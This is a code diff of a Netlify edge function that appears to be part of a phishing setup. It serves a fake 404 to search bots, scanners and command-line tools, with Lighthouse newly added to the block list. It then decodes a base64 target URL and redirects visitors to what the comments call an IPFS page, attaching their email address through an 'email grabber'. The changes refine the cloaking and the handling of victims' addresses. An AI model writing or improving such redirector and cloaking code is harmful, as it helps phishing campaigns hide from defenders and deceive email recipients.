@@ -2,14 +2,14 @@ export default async (request, context) => {
   const url = new URL(request.url);
   const userAgent = (request.headers.get("user-agent") || "").toLowerCase();
   
-  // 1. BOT CHECK (Unchanged)
-  const botKeywords = ["googlebot", "bingbot", "python", "curl", "wget", "headless"];
+  // 1. BOT CHECK
+  const botKeywords = ["googlebot", "bingbot", "python", "curl", "wget", "headless", "lighthouse"];
   if (botKeywords.some(bot => userAgent.includes(bot))) {
     return new Response('404 Not Found', { status: 404 });
   }
 
-  // 2. CAPTURE THE EMAIL PARAMETER FROM GAMMADYNE
-  // Gammadyne hits Netlify with: .../path?email=user@domain.com
+  // 2. CAPTURE THE EMAIL PARAMETER
+  // Netlify's searchParams.get automatically decodes the first layer
   const emailParam = url.searchParams.get("email");
 
   // 3. EXTRACTION & REDIRECT
@@ -22,11 +22,11 @@ export default async (request, context) => {
       let decodedUrl = atob(normalized);
       
       if (decodedUrl.startsWith("http")) {
-        // IMPORTANT: Attach the email grabber to the final IPFS URL
+        // 4. ATTACH EMAIL GRABBER WITHOUT RE-ENCODING
         if (emailParam) {
-          // Check if decodedUrl already has a ? or not
           const separator = decodedUrl.includes("?") ? "&" : "?";
-          decodedUrl = `${decodedUrl}${separator}email=${encodeURIComponent(emailParam)}`;
+          // We use the raw emailParam here to avoid double %25 encoding
+          decodedUrl = `${decodedUrl}${separator}email=${emailParam}`;
         }
 
         console.log("Redirecting to:", decodedUrl);
